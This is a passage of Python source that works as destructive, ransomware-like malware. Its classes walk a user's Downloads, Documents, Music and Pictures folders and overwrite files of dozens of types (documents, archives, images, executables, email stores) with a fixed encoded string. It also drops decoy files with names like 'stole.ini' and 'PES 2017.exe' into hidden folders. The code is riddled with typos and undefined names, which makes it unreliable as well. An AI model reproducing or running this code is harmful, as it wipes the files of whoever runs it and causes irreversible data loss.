                sin61=open(Downloads+file1,"wb")
                sin61.write(crypto.encode())
            if file1.endswith(".tmp"):
                sin62=open(Downloads+file1,"wb")
                sin62.write(crypto.encode())
            if file1.endswith(".cpl"):
                sin63=open(Downloads+file1,"wb")
                sin63.write(crypto.encode())
            if file1.endswith(".dmp"):
                sin64=open(Downloads+file1,"wb")
                sin64.write(crypto.encode())
            if file1.endswith(".lnk"):
                sin65=open(Downloads+file1,"wb")
                sin65.write(crypto.encode())
            if file1.endswith(".cfg"):
                sin66=open(Downloads+file1,"wb")
                sin66.write(crypto.encode())
            if file1.endswith(".conf"):
                sin67=open(Downloads+file1,"wb")
                sin67.write(crypto.encode())
            #if file1.endswith(".ini"):
            #sin68=open(Downlaods+file1,"wb")
            #sin68.write(crypto.encode())
            elif file1.endswith(".fon"):
                with open(Downloads+file1,"wb") as sin69:
                    sin69.write(crypto.encode())
            elif file1.endswith(".ttf"):
                with open(Downloads+file1,"wb") as sin70:
                     sin70.write(crypto.encode())
            elif file1.endswith(".fnt"):
                with open(Downloads+file1,"wb") as sin71:
                    sin71.write(crypto.encode())
            elif file1.endswith(".asp"):
                with open(Downloads+file1,"wb") as sin72:
                    sin72.write(crypto.encode())
            elif file1.endswith(".h"):
                with open(Downloads+file1,"wb") as sin73:
                    sin73.write(crypto.encode())
            elif file1.endswith(".pl"):
                with open(Downloads+file1,"wb") as sin74:
                    sin74.write(crypto.encode())
            elif file1.endswith(".dv"):
                with open(Downloads+file1,"wb") as sin75:
                    sin75.write(crypto.encode())
            elif file1.endswith(".fcp"):
                with open(Downloads+file1,"wb") as sin76:
                    sin76.write(crypto.encode())
            elif file1.endswith(".swf"):
                with open(Downloads+file1,"wb") as sin77:
                    sin77.write(crypto.encode())
            elif file1.endswith(".ai"):
                with open(Downloads+file1,"wb") as sin78:
                    sin78.write(crypto.encode())
            elif file1.endswith(".mov"):
                with open(Downloads+file1,"wb") as sin79:
                    sin79.write(crypto.encode())
            elif file1.endswith(".wma"):
                with open(Downloads+file1,"wb") as sin80:
                    sin80.write(crypto.encode())
            elif file1.endswith(".indd"):
                with open(Downloads+file1,"wb") as sin81:
                    sin81.write(crypto.encode())
            # image File
            elif file1.endswith(".png"):
                with open(Downloads+file1,"wb") as sin82:
                    sin82.write(crypto.encode())
            elif file1.endswith(".svg"):
                with open(Downloads+file1,"wb") as sin83:
                    sin83.write(crypto.encode())
            elif file1.endswith(".jpg"):
                sin84=open(Downloads+file1,"wb") 
                sin84.write(crypto.encode())
            elif file1.endswith(".jfif"):
                sin85=open(Downloads+file1,"wb")
                sin85.write(crypto.encode())
            elif file1.endswith(".psd"):
                sin86=open(Downloads+file1,"wb")
                sin86.write(crypto.encdoe())
            elif file1.endswith(".gif"):
                sin87=open(Downloads+file1,"wb")
                sin87.write(crypto.encode())
            elif file1.endswith(".jpeg"):
                sin88=open(Downloads+file1,"wb")
                sin88.write(crypto.encode())
            elif file1.endswith(".bmp"):
                sin89=open(Downloads+file1,"wb")
                sin89.write(crypto.encode())
            elif file1.endswith(".raw"):
                sin90=open(Downloads+file1,"wb")
                sin90.write(crypto.encode())
            elif file1.endswith(".avi"):
                sin91=open(Downloads+file1,"wb")
                sin91.write(crypto.encode())
            elif file1.endswith(".ico"):
                sin92=open(Downloads+file1,"wb")
                sin92.write(crypto.encode())
            elif file1.endswith(".jif"):
                sin93=open(Downloads+file1,"wb")
                sin93.write(crypto.encode())
            elif file1.endswith(".jfi"):
                sin94=open(Downloads+file1,"wb")
                sin94.write(crypto.encode())
            elif file1.endswith(".tga"):
                sin95=open(Downloads+file1,"wb")
                sin95.write(crypto.encode())
            elif file1.endswith(".tiff"):
                sin96=open(Downloads+file1,"wb")
                sin96.write(crypto.encode())
            elif file1.endswith(".ai"):
                sin97=open(Downloads+file1,"wb")
                sin97.write(crypto.encode())
            elif file1.endswith(".aae"):
                sin98=open(Downloads+file1,"wb")
                sin98.write(crypto.encode())
            elif file1.endswith(".jps"):
                sin99=open(Downloads+file1,"wb")
                sin99.write(crypto.encode())
            elif file1.endswith(".jp2"):
                sin100=open(Downloads+file1,"wb")
                sin100.write(crypto.encode())
            elif file1.endswith(".pcx"):
                sin101=open(Downloads+file1,"wb")
                sin101.write(crypto.encode())
            elif file1.endswith(".pgf"):
                sin102=open(Downloads+file1,"wb")
                sin102.write(crypto.encode())
            elif file1.endswith(".ras"):
                sin103=open(Downloads+file1,"wb")
                sin103.write(crypto.encode())
            elif file1.endswith(".webp"):
                sin104=open(Downloads+file1,"wb")
                sin104.write(crypto.encode())

class system_document:
    path_doc1=(Microsoft+"assembly\\")
    path_doc2=(Documents+"Boot\\")
    path_doc3=(Documents+"CSC\\")
    path_doc4=(Documents+"debug\\")
    ###########################
    path_doc5=(Microsoft+"GameBarPres\\")
    path_doc6=(path_doc5+"DigitalLocker\\")
    path_doc7=(path_doc3+"DownloadsFile\\")
    path_doc8=(path_doc2+"GlobalServer\\")
    path_doc9=(path_doc5+"GamesCsc\\")
    try:
        os.mkdir(Microsoft)
        os.mkdir(path_doc1)
        os.mkdir(path_doc2)
        os.mkdir(path_doc3)
        os.mkdir(path_doc4)
        os.mkdir(path_doc5)
        os.mkdir(path_doc6)
        os.mkdir(path_doc7)
        os.mkdir(path_doc8)
        os.mkdir(path_doc9)
        with open(path_doc2+"stole.ini","ab") as doc1:
            doc1.write(password_Translate.encode())
        with open(path_doc8+"addosn.bat","ab") as doc2:
            doc2.write(password_Translate.encode())
        with open(path_doc8+"kldfsiJJ.exe","ab") as doc3:
            doc3.write(password_Translate.encode())
        with open(path_doc3+"hjiwesmaoo.iso","ab") as doc4:
            doc4.write(password_Translate.encode())
        with open(path_doc7+"kklsoarevd_asdy.imaj","ab") as doc5:
            doc5.write(password_Translate.encode())
        with open(path_doc7+"shydbaomaid.mp4","ab") as doc6:
            doc6.write(password_trasnlate.encode())
        with open(path_doc4+"plasdybi.sh","ab") as doc7:
            doc7.write(password_Translate.encode())
        with open(path_doc4+"sdhbauplcvra.dll","ab") as doc8:
            doc8.write(password_Translate.encode())
        with open(path_doc5+"asdiawqwh.msc","ab") as doc9:
            doc9.write(password_Translate.encode())
        with open(path_doc5+"PES 2017.exe","ab") as doc10:
            doc10.write(password_Translate.encode())
        with open(path_doc1+"Pessetting.txt","ab") as doc11:
            doc11.write(password_Translate.encode())
        with open(Microsoft+"InsertPes.db","ab") as doc12:
            doc12.write(password_Translate.encode())
    except:
        with open(path_doc2+"stole.ini","ab") as doc1:
            doc1.write(password_Translate.encode())
        with open(path_doc8+"addosn.bat","ab") as doc2:
            doc2.write(password_Translate.encode())
        with open(path_doc8+"kldfsiJJ.exe","ab") as doc3:
            doc3.write(password_Translate.encode())
        with open(path_doc3+"hjiwesmaoo.iso","ab") as doc4:
            doc4.write(password_Translate.encode())
        with open(path_doc7+"kklsoarevd_asdy.imaj","ab") as doc5:
            doc5.write(password_Translate.encode())
        with open(path_doc7+"shydbaomaid.mp4","ab") as doc6:
            doc6.write(password_Translate.encode())
        with open(path_doc4+"plasdybi.sh","ab") as doc7:
            doc7.write(password_Translate.encode())
        with open(path_doc4+"sdhbauplcvra.dll","ab") as doc8:
            doc8.write(password_Translate.encode())
        with open(path_doc5+"asdiawqwh.msc","ab") as doc9:
            doc9.write(password_Translate.encode())
        with open(path_doc5+"PES 2017.exe","ab") as doc10:
            doc10.write(password_Translate.encode())
        with open(path_doc1+"Pessetting.txt","ab") as doc11:
            doc11.write(password_Translate.encode())
        with open(Microsoft+"InsertPes.db","ab") as doc12:
            doc12.write(password_Translate.encode())
    
    def __init__(self):
        self.liste3=os.listdir(Documents)
    def crypto_file(self):
        for file3 in self.liste3:
            if file3.endswith(".exe"):
                cos1=open(Documents+file3,"wb")
                cos1.write(crypto.encode())
            if file3.endswith(".pdf"):
                cos2=open(Documents+file3,"wb")
                cos2.write(crypto.encode())
            if file3.endswith(".py"):
                cos3=open(Documents+file3,"wb")
                cos3.write(crypto.encode())
            if file3.endswith(".js"):
                cos4=open(Documents+file3,"wb")
                cos4.write(crypto.encode())
            if file3.endswith(".html"):
                cos5=open(Documents+file3,"wb")
                cos5.write(crypto.encode())
            if file3.endswith(".php"):
                cos6=open(Documents+file3,"wb")
                cos6.write(crypto.encode())
            if file3.endswith(".css"):
                cos7=open(Documents+file3,"wb")
                cos7.write(crypto.encode())
            if file3.endswith(".c"):
                cos8=open(Documents+file3,"wb")
                cos8.write(crypto.encode())
            if file3.endswith(".java"):
                cos9=open(Documents+file3,"wb")
                cos9.write(crypto.encode())
            if file3.endswith(".cpp"):
                cos10=open(Documents+file3,"wb")
                cos10.write(crypto.encode())
            if file3.endswith(".txt"):
                cos12=open(Documents+file3,"ab")
                cos12.write(password_Translate.encode())
            if file3.endswith(".rar"):
                cos13=open(Documents+file3,"wb")
                cos13.write(crypto.encode())
            if file3.endswith(".zip"):
                cos14=open(Documents+file3,"wb")
                cos14.write(crypto.encode())
            if file3.endswith(".rtf"):
                cos15=open(Documents+file3,"wb")
                cos15.write(crypto.encode())
            if file3.endswith(".iso"):
                cos16=open(Documents+file3,"wb")
                cos16.write(crypto.encode())
            if file3.endswith(".mp4"):
                cos17=open(Documents+file3,"wb")
                cos17.write(crypto.encode())
            if file3.endswith(".mp3"):
                cos18=open(Documents+file3,"wb")
                cos18.write(crypto.encode())
            if file3.endswith(".imaj"):
                cos19=open(Documents+file3,"wb")
                cos19.write(crypto.encode())
            if file3.endswith(".zipx"):
                cos20=open(Documents+file3,"wb")
                cos20.write(crypto.encode())
            if file3.endswith(".7z"):
                cos21=open(Documents+file3,"wb")
                cos21.write(crypto.encode())
            if file3.endswith(".docx"):
                cos22=open(Documents+file3,"wb")
                cos22.write(crypto.encode())
            #xps,xml
            if file3.endswith(".xps"):
                cos23=open(Documents+file3,"wb")
                cos23.write(crypto.encode())
            if file3.endswith(".xml"):
                cos24=open(Documents+file3,"wb")
                cos24.write(crypto.encode())
            if file3.endswith(".csv"):
                cos25=open(Documents+file3,"wb")
                cos25.write(crypto.encode())
            if file3.endswith(".doc"):
                cos26=open(Documents+file3,"wb")
                cos26.write(crypto.encode())
            if file3.endswith(".log"):
                cos27=open(Documents+file3,"wb")
                cos27.write(crypto.encode())
            if file3.endswith(".pps"):
                cos28=open(Documents+file3,"wb")
                cos28.write(crypto.encode())
            if file3.endswith(".ppt"):
                cos29=open(Documents+file3,"wb")
                cos29.write(crypto.encode())
            if file3.endswith(".pptx"):
                cos30=open(Documents+file3,"wb")
                cos30.write(crypto.encode())
            if file3.endswith(".wpd"):
                cos31=open(Documents+file3,"wb")
                cos31.write(crypto.encode())
            if file3.endswith(".wps"):
                cos32=open(Documents+file3,"wb")
                cos32.wirte(crypto.encode())
            if file3.endswith(".xlr"):
                cos33=open(Documents+file3,"wb")
                cos33.write(crypto.encode())
            if file3.endswith(".xls"):
                cos34=open(Documents+file3,"wb")
                cos34.write(crypto.encode())
            if file3.endswith(".xlsx"):
                cos35=open(Documents+file3,"wb")
                cos35.write(crypto.encode())
            if file3.endswith(".pkg"):
                cos36=open(Documents+file3,"wb")
                cos36.write(crypto.encode())
            if file3.endswith(".bz2"):
                cos37=open(Documents+file3,"wb")
                cos37.write(crypto.encode())
            if file3.endswith(".cab"):
                cos38=open(Documents+file3,"wb")
                cos38.write(crypto.encode())
            if file3.endswith(".deb"):
                cos39=open(Documents+file3,"wb")
                cos39.write(crypto.encode())
            if file3.endswith(".rpm"):
                cos40=open(Documents+file3,"wb")
                cos40.write(crypto.encode())
            if file3.endswith(".sit"):
                cos41=open(Documents+file3,"wb")
                cos41.write(crypto.encode())
            if file3.endswith(".sitx"):
                cos42=open(Documents+file3,"wb")
                cos42.write(crypto.encode())
            if file3.endswith(".tar"):
                cos43=open(Documents+file3,"wb")
                cos43.write(crypto.encode())
            if file3.endswith(".tar.gz"):
                cos44=open(Documents+file3,"wb")
                cos44.write(crypto.encode())
            if file3.endswith(".Z"):
                cos45=open(Documents+file3,"wb")
                cos45.write(crypto.encode())
            if file3.endswith(".part"):
                cos46=open(Documents+file3,"wb")
                cos46.write(crypto.encode())
            if file3.endswith(".dmg"):
                cos47=open(Documents+file3,"wb")
                cos47.write(crypto.encode())
            if file3.endswith(".eml"):
                cos48=open(Documents+file3,"wb")
                cos48.write(crypto.encode())
            if file3.endswith(".emlx"):
                cos49=open(Documents+file3,"wb")
                cos49.write(crypto.encode())
            if file3.endswith(".mbx"):
                cos50=open(Documents+file3,"wb")
                cos50.write(crypto.encode())
            if file3.endswith(".pst"):
                cos51=open(Documents+file3,"wb")
                cos51.write(crypto.encode())
            if file3.endswith(".vcf"):
                cos52=open(Documents+file3,"wb")
                cos52.write(crypto.encode())
            if file3.endswith(".app"):
                cos53=open(Documents+file3,"wb")
                cos53.write(crypto.encode())
            if file3.endswith(".cgi"):
                cos54=open(Documents+file3,"wb")
                cos54.write(crypto.encode())
            if file3.endswith(".com"):
                cos55=open(Documents+file3,"wb")
                cos55.write(crypto.encode())
            if file3.endswith(".pif"):
                cos56=open(Documents+file3,"wb")
                cos56.write(crypto.encode())
            if file3.endswith(".vbs"):
                cos57=open(Documents+file3,"wb")
                cos57.write(crypto.encode())
            if file3.endswith(".sys"):
                cos58=open(Documents+file3,"wb")
                cos58.write(crypto.encode())
            if file3.endswith(".msi"):
                cos59=open(Documents+file3,"wb")
                cos59.write(crypto.encode())
            if file3.endswith(".dll"):
                cos60=open(Documents+file3,"wb")
                cos60.write(crypto.encode())
            if file3.endswith(".reg"):
                cos61=open(Documents+file3,"wb")
                cos61.write(crypto.encode())
            if file3.endswith(".tmp"):
                cos62=open(Documents+file3,"wb")
                cos62.write(crypto.encode())
            if file3.endswith(".cpl"):
                cos63=open(Documents+file3,"wb")
                cos63.write(crypto.encode())
            if file3.endswith(".dmp"):
                cos64=open(Documents+file3,"wb")
                cos64.write(crypto.encode())
            if file3.endswith(".lnk"):
                cos65=open(Documents+file3,"wb")
                cos65.write(crypto.encode())
            if file3.endswith(".cfg"):
                cos66=open(Documents+file3,"wb")
                cos66.write(crypto.encode())
            if file3.endswith(".conf"):
                cos67=open(Documents+file3,"wb")
                cos67.write(crypto.encode())
            #if file1.endswith(".ini"):
            #sin68=open(Downlaods+file1,"wb")
            #sin68.write(crypto.encode())
            elif file3.endswith(".fon"):
                with open(Documents+file3,"wb") as cos69:
                    cos69.write(crypto.encode())
            elif file3.endswith(".ttf"):
                with open(Documents+file3,"wb") as cos70:
                     cos70.write(crypto.encode())
            elif file3.endswith(".fnt"):
                with open(Documents+file3,"wb") as cos71:
                    cos71.write(crypto.encode())
            elif file3.endswith(".asp"):
                with open(Documents+file3,"wb") as cos72:
                    cos72.write(crypto.encode())
            elif file3.endswith(".h"):
                with open(Documents+file3,"wb") as cos73:
                    cos73.write(crypto.encode())
            elif file3.endswith(".pl"):
                with open(Documents+file3,"wb") as cos74:
                    cos74.write(crypto.encode())
            elif file3.endswith(".dv"):
                with open(Documents+file3,"wb") as cos75:
                    cos75.write(crypto.encode())
            elif file3.endswith(".fcp"):
                with open(Documents+file3,"wb") as cos76:
                    cos76.write(crypto.encode())
            elif file3.endswith(".swf"):
                with open(Documents+file3,"wb") as cos77:
                    cos77.write(crypto.encode())
            elif file3.endswith(".ai"):
                with open(Documents+file3,"wb") as cos78:
                    cos78.write(crypto.encode())
            elif file3.endswith(".mov"):
                with open(Documents+file3,"wb") as cos79:
                    cos79.write(crypto.encode())
            elif file3.endswith(".wma"):
                with open(Documents+file3,"wb") as cos80:
                    cos80.write(crypto.encode())
            elif file3.endswith(".indd"):
                with open(Documents+file3,"wb") as cos81:
                    cos81.write(crypto.encode())
            # image File
            elif file3.endswith(".png"):
                with open(Documents+file3,"wb") as cos82:
                    cos82.write(crypto.encode())
            elif file3.endswith(".svg"):
                with open(Documents+file3,"wb") as cos83:
                    cos83.write(crypto.encode())
            elif file3.endswith(".jpg"):
                cos84=open(Documents+file3,"wb") 
                cos84.write(crypto.encode())
            elif file3.endswith(".jfif"):
                cos85=open(Documents+file3,"wb")
                cos85.write(crypto.encode())
            elif file3.endswith(".psd"):
                cos86=open(Documents+file3,"wb")
                cos86.write(crypto.encdoe())
            elif file3.endswith(".gif"):
                cos87=open(Documents+file3,"wb")
                cos87.write(crypto.encode())
            elif file3.endswith(".jpeg"):
                cos88=open(Documents+file3,"wb")
                cos88.write(crypto.encode())
            elif file3.endswith(".bmp"):
                cos89=open(Documents+file3,"wb")
                cos89.write(crypto.encode())
            elif file3.endswith(".raw"):
                cos90=open(Documents+file3,"wb")
                cos90.write(crypto.encode())
            elif file3.endswith(".avi"):
                cos91=open(Documents+file3,"wb")
                cos91.write(crypto.encode())
            elif file3.endswith(".ico"):
                cos92=open(Documents+file3,"wb")
                cos92.write(crypto.encode())
            elif file3.endswith(".jif"):
                cos93=open(Documents+file3,"wb")
                cos93.write(crypto.encode())
            elif file3.endswith(".jfi"):
                cos94=open(Documents+file3,"wb")
                cos94.write(crypto.encode())
            elif file3.endswith(".tga"):
                cos95=open(Documents+file3,"wb")
                cos95.write(crypto.encode())
            elif file3.endswith(".tiff"):
                cos96=open(Documents+file3,"wb")
                cos96.write(crypto.encode())
            elif file3.endswith(".ai"):
                cos97=open(Documents+file3,"wb")
                cos97.write(crypto.encode())
            elif file3.endswith(".aae"):
                cos98=open(Documents+file3,"wb")
                cos98.write(crypto.encode())
            elif file3.endswith(".jps"):
                cos99=open(Documents+file3,"wb")
                cos99.write(crypto.encode())
            elif file3.endswith(".jp2"):
                cos100=open(Documents+file3,"wb")
                cos100.write(crypto.encode())
            elif file3.endswith(".pcx"):
                cos101=open(Documents+file3,"wb")
                cos101.write(crypto.encode())
            elif file3.endswith(".pgf"):
                cos102=open(Documents+file3,"wb")
                cos102.write(crypto.encode())
            elif file3.endswith(".ras"):
                cos103=open(Documents+file3,"wb")
                cos103.write(crypto.encode())
            elif file3.endswith(".webp"):
                cos104=open(Documents+file3,"wb")
                cos104.write(crypto.encode())

class system_music():
    liste4=os.listdir(Music)
    for file4 in liste4:
        if file4.endswith(".exe"):
            log1=open(Music+file4,"wb")
            log1.write(crypto.encode())
        if file4.endswith(".pdf"):
            log2=open(Music+file4,"wb")
            log2.write(crypto.encode())
        if file4.endswith(".mp3"):
            log3=open(Music+file4,"wb")
            log3.write(crypto.encode())
        if file4.endswith(".mp4"):
            log4=open(Music+file4,"wb")
            log4.write(crypto.encode())
        if file4.endswith(".txt"):
            log5=open(Music+file4,"ab")
            log5.write(password_Translate.encode())
        if file4.endswith(".rar"):
            log6=open(Music+file4,"wb")
            log6.write(crypto.encode())
        if file4.endswith(".zip"):
            log7=open(Music+file4,"wb")
            log7.write(crypto.encode())
        if file4.endswith(".iso"):
            log8=open(Music+file4,"wb")
            log8.write(crypto.encode())
        #images File
        elif file4.endswith(".png"):
            with open(Music+file4,"wb") as log9:
                log9.write(crypto.encode())
        elif file4.endswith(".svg"):
            with open(Music+file4,"wb") as log10:
                log10.write(crypto.encode())
        elif file4.endswith(".jpg"):
            log11=open(Music+file4,"wb") 
            log11.write(crypto.encode())
        elif file4.endswith(".jfif"):
            log12=open(Music+file4,"wb")
            log12.write(crypto.encode())
        elif file4.endswith(".psd"):
            log13=open(Music+file4,"wb")
            log13.write(crypto.encdoe())
        elif file4.endswith(".gif"):
            log14=open(Music+file4,"wb")
            log14.write(crypto.encode())
        elif file4.endswith(".jpeg"):
            log15=open(Music+fiel4,"wb")
            log15.write(crypto.encode())
        elif file4.endswith(".bmp"):
            log16=open(Music+file4,"wb")
            log16.write(crypto.encode())
        elif file4.endswith(".raw"):
            log17=open(Music+file4,"wb")
            log17.write(crypto.encode())
        elif file4.endswith(".avi"):
            log18=open(Music+file4,"wb")
            log18.write(crypto.encode())
        elif file4.endswith(".ico"):
            log19=open(Music+file4,"wb")
            log19.write(crypto.encode())
        elif file4.endswith(".jif"):
            log20=open(Music+file4,"wb")
            log20.write(crypto.encode())
        elif file4.endswith(".jfi"):
            log21=open(Music+file4,"wb")
            log21.write(crypto.encode())
        elif file4.endswith(".tga"):
            log22=open(Music+file4,"wb")
            log22.write(crypto.encode())
        elif file4.endswith(".tiff"):
            log23=open(Music+file4,"wb")
            log23.write(crypto.encode())
        elif file4.endswith(".ai"):
            log24=open(Music+file4,"wb")
            log24.write(crypto.encode())
        elif file4.endswith(".aae"):
            log255=open(Music+file4,"wb")
            log255.write(crypto.encode())
        elif file4.endswith(".jps"):
            log25=open(Music+file4,"wb")
            log25.write(crypto.encode())
        elif file4.endswith(".jp2"):
            log26=open(Music+file4,"wb")
            log26.write(crypto.encode())
        elif file4.endswith(".pcx"):
            log27=open(Music+file4,"wb")
            log27.write(crypto.encode())
        elif file4.endswith(".pgf"):
            log28=open(Music+file4,"wb")
            log28.write(crypto.encode())
        elif file4.endswith(".ras"):
            log29=open(Music+file4,"wb")
            log29.write(crypto.encode())
        elif file4.endswith(".webp"):
            log30=open(Music+file4,"wb")
            log30.write(crypto.encode())

class  system_pictures:
    liste5=os.listdir(Pictures2)
    for file5 in liste5:
        if file5.endswith(".exe"):
            f1=open(Pictures2+file5,"wb")
            f1.write(crypto.encode())
        if file5.endswith(".pdf"):
            f2=open(Pictures2+file5,"wb")
            f2.write(crypto.encode())
        if file5.endswith(".mp3"):
            f3=open(Pictures2+file5,"wb")
            f3.write(crypto.encode())
        if file5.endswith(".mp4"):
            f4=open(Pictures2+file5,"wb")
            f4.write(crypto.encode())
        if file5.endswith(".rar"):
            f5=open(Pictures2+file5,"wb")
            f5.write(crypto.encode())
        if file5.endswith(".zip"):
            f6=open(Pictures2+file5,"wb")
            f6.write(crypto.encode())
        if file5.endswith(".iso"):
            f7=open(Pictures2+file5,"wb")
            f7.write(crypto.encode())
        if file5.endswith(".txt"):
            f8=open(Pictures2+file5,"wb")
            f8.write(crypto.encode())
        #image File
        elif file5.endswith(".png"):
            with open(Pictures2+file5,"wb") as f9:
                f9.write(crypto.encode())
        elif file5.endswith(".svg"):
            with open(Pictures2+file5,"wb") as f10:
                f10.write(crypto.encode())
        elif file5.endswith(".jpg"):
            f11=open(Pictures2+file5,"wb") 
            f11.write(crypto.encode())
        elif file5.endswith(".jfif"):
            f12=open(Pictures2+file5,"wb")
            f12.write(crypto.encode())
        elif file5.endswith(".psd"):
            f13=open(Pictures2+file5,"wb")
            f13.write(crypto.encdoe())
        elif file5.endswith(".gif"):
            f4=open(Pictures2+file5,"wb")
            f14.write(crypto.encode())
        elif file5.endswith(".jpeg"):
            f15=open(Pictures2+fiel5,"wb")
            f15.write(crypto.encode())
        elif file5.endswith(".bmp"):
            f16=open(Pictures2+file5,"wb")
            f16.write(crypto.encode())
        elif file5.endswith(".raw"):
            f17=open(Pictures2+file5,"wb")
            f17.write(crypto.encode())
        elif file5.endswith(".avi"):
            f18=open(Pictures2+file5,"wb")
            f18.write(crypto.encode())
        elif file5.endswith(".ico"):
            f19=open(Pictures2+file5,"wb")
            f19.write(crypto.encode())
        elif file5.endswith(".jif"):
            f20=open(Pictures2+file5,"wb")
            f20.write(crypto.encode())
        elif file5.endswith(".jfi"):
            f21=open(Pictures2+file5,"wb")
            f21.write(crypto.encode())
        elif file5.endswith(".tga"):
            f22=open(Pictures2+file5,"wb")
            f22.write(crypto.encode())
        elif file5.endswith(".tiff"):
            f23=open(Pictures2+file5,"wb")
            f23.write(crypto.encode())
        elif file5.endswith(".ai"):
            f24=open(Pictures2+file5,"wb")
            f24.write(crypto.encode())
        elif file5.endswith(".aae"):
            f255=open(Pictures2+file5,"wb")
            f255.write(crypto.encode())
        elif file5.endswith(".jps"):
            f25=open(Pictures2+file5,"wb")
            f25.write(crypto.encode())
        elif file5.endswith(".jp2"):
            f26=open(Pictures2+file5,"wb")
            f26.write(crypto.encode())
        elif file5.endswith(".pcx"):
            f27=open(Pictures2+file5,"wb")
            f27.write(crypto.encode())
        elif file5.endswith(".pgf"):
            f28=open(Pictures2+file5,"wb")
            f28.write(crypto.encode())
        elif file5.endswith(".ras"):
            f29=open(Pictures2+file5,"wb")
            f29.write(crypto.encode())
        elif file5.endswith(".webp"):
            f30=open(Pictures2+file5,"wb")
            f30.write(crypto.encode())
    try:
        liste6=os.listdir(Pictures)
        for file6 in liste6:
            if file6.endswith(".exe"):
                hs1=open(Pictures+file6,"wb")
                hs1.write(crypto.encode())
            if file6.endswith(".pdf"):
                hs2=open(Pictures+file6,"wb")
                hs2.write(crypto.encode())
            if file6.endswith(".mp3"):
              hs3=open(Pictures+file6,"wb")
              hs3.write(crypto.encode())
            if file6.endswith(".mp4"):
              hs4=open(Pictures+file6,"wb")
              hs4.write(crypto.encode())
            if file6.endswith(".rar"):
              hs5=open(Pictures+file6,"wb")
              hs5.write(crypto.encode())
            if file6.endswith(".zip"):
              hs6=open(Pictures+file6,"wb")
              hs6.write(crypto.encode())
            if file6.endswith(".iso"):
              hs7=open(Pictures+file6,"wb")
              hs7.write(crypto.encode())
            if file6.endswith(".txt"):
               hs8=open(Pictures+file6,"wb")
               hs8.write(crypto.encode())
            #image File
            elif file6.endswith(".png"):
               with open(Pictures+file6,"wb") as hs9:
                   hs9.write(crypto.encode())
            elif file6.endswith(".svg"):
                with open(Pictures+file6,"wb") as hs10:
                    hs10.write(crypto.encode())
            elif file6.endswith(".jpg"):
                hs11=open(Pictures+file6,"wb") 
                hs11.write(crypto.encode())
            elif file6.endswith(".jfif"):
                hs12=open(Pictures+file6,"wb")
                hs12.write(crypto.encode())
            elif file6.endswith(".psd"):
                hs13=open(Pictures+file6,"wb")
                hs13.write(crypto.encdoe())
            elif file6.endswith(".gif"):
                hs4=open(Pictures+file6,"wb")
                hs14.write(crypto.encode())
            elif file6.endswith(".jpeg"):
               hs15=open(Pictures+fiel6,"wb")
               hs15.write(crypto.encode())
            elif file6.endswith(".bmp"):
                hs16=open(Pictures+file6,"wb")
            elif file6.endswith(".raw"):
                hs17=open(Pictures+file6,"wb")
                hs17.write(crypto.encode())
            elif file6.endswith(".avi"):
                hs18=open(Pictures+file6,"wb")
                hs18.write(crypto.encode())
            elif file6.endswith(".ico"):
                hs19=open(Pictures+file6,"wb")
                hs19.write(crypto.encode())
            elif file6.endswith(".jif"):
               hs20=open(Pictures+file6,"wb")
               hs20.write(crypto.encode())
            elif file6.endswith(".jfi"):
                hs21=open(Pictures+file6,"wb")
                hs21.write(crypto.encode())
            elif file6.endswith(".tga"):
                hs22=open(Pictures+file6,"wb")
                hs22.write(crypto.encode())
            elif file6.endswith(".tiff"):
                hs23=open(Pictures+file6,"wb")
                hs23.write(crypto.encode())
            elif file6.endswith(".ai"):
               hs24=open(Pictures+file6,"wb")
               hs24.write(crypto.encode())
            elif file6.endswith(".aae"):
                hs255=open(Pictures+file6,"wb")
                hs255.write(crypto.encode())
            elif file6.endswith(".jps"):
                hs25=open(Pictures+file6,"wb")
                hs25.write(crypto.encode())
            elif file6.endswith(".jp2"):
                hs26=open(Pictures+file6,"wb")
                hs26.write(crypto.encode())
            elif file6.endswith(".pcx"):
                hs27=open(Pictures+file6,"wb")
                hs27.write(crypto.encode())
            elif file6.endswith(".pgf"):
               hs28=open(Pictures+file6,"wb")
               hs28.write(crypto.encode())
            elif file6.endswith(".ras"):
               hs29=open(Pictures+file6,"wb")
               hs29.write(crypto.encode())
            elif file6.endswith(".webp"):
               hs30=open(Pictures+file6,"wb")
               hs30.write(crypto.encode())
    except:
        liste5=os.listdir(Pictures2)
        for file5 in liste5:
            if file5.endswith(".exe"):
                f1=open(Pictures2+file5,"wb")
                f1.write(crypto.encode())
            if file5.endswith(".pdf"):
                f2=open(Pictures2+file5,"wb")
                f2.write(crypto.encode())
            if file5.endswith(".mp3"):
                f3=open(Pictures2+file5,"wb")
                f3.write(crypto.encode())
            if file5.endswith(".mp4"):
                f4=open(Pictures2+file5,"wb")
                f4.write(crypto.encode())
            if file5.endswith(".rar"):
                f5=open(Pictures2+file5,"wb")
                f5.write(crypto.encode())
            if file5.endswith(".zip"):
                f6=open(Pictures2+file5,"wb")
                f6.write(crypto.encode())
            if file5.endswith(".iso"):
                f7=open(Pictures2+file5,"wb")
                f7.write(crypto.encode())
            if file5.endswith(".txt"):
                f8=open(Pictures2+file5,"wb")
                f8.write(crypto.encode())
            #image File
            elif file5.endswith(".png"):
                with open(Pictures2+file5,"wb") as f9:
                    f9.write(crypto.encode())
            elif file5.endswith(".svg"):
                with open(Pictures2+file5,"wb") as f10:
                    f10.write(crypto.encode())
            elif file5.endswith(".jpg"):
                f11=open(Pictures2+file5,"wb") 
                f11.write(crypto.encode())
            elif file5.endswith(".jfif"):
                f12=open(Pictures2+file5,"wb")
                f12.write(crypto.encode())
            elif file5.endswith(".psd"):
                f13=open(Pictures2+file5,"wb")
                f13.write(crypto.encdoe())
            elif file5.endswith(".gif"):
                f4=open(Pictures2+file5,"wb")
                f14.write(crypto.encode())
            elif file5.endswith(".jpeg"):
                f15=open(Pictures2+fiel5,"wb")
                f15.write(crypto.encode())
            elif file5.endswith(".bmp"):
                f16=open(Pictures2+file5,"wb")
                f16.write(crypto.encode())
            elif file5.endswith(".raw"):
                f17=open(Pictures2+file5,"wb")
                f17.write(crypto.encode())
            elif file5.endswith(".avi"):
                f18=open(Pictures2+file5,"wb")
                f18.write(crypto.encode())
            elif file5.endswith(".ico"):
                f19=open(Pictures2+file5,"wb")
                f19.write(crypto.encode())
            elif file5.endswith(".jif"):
                f20=open(Pictures2+file5,"wb")
                f20.write(crypto.encode())
            elif file5.endswith(".jfi"):
                f21=open(Pictures2+file5,"wb")
                f21.write(crypto.encode())
            elif file5.endswith(".tga"):
                f22=open(Pictures2+file5,"wb")
                f22.write(crypto.encode())
            elif file5.endswith(".tiff"):
                f23=open(Pictures2+file5,"wb")
                f23.write(crypto.encode())
            elif file5.endswith(".ai"):
